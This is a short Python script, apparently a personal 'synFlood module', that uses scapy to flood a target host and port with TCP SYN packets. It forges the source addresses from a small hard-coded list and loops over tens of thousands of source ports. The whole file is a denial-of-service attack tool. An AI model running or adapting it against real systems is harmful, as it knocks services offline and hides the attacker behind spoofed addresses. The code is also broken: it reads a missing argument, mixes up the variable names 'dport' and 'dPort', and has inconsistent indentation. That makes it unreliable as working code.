#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#' synFlood module '

__author__ = 'Hongchao Du'

import sys
import random
from scapy.all import *

def synFlood():
	args=sys.argv
	if len(args)==1:
		print('Need more arguments!')
		return 
	elif len(args)==2:
		tgt = args[1]
		dport = args[2]
	
	srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
	for sPort in range(1024,65535):
 		index = random.randrange(4)
		ipLayer = IP(src=srcList[index], dst=tgt)
		tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
		packet = ipLayer / tcpLayer 
		send(packet)

if __name__=='__main__':
    synFlood()
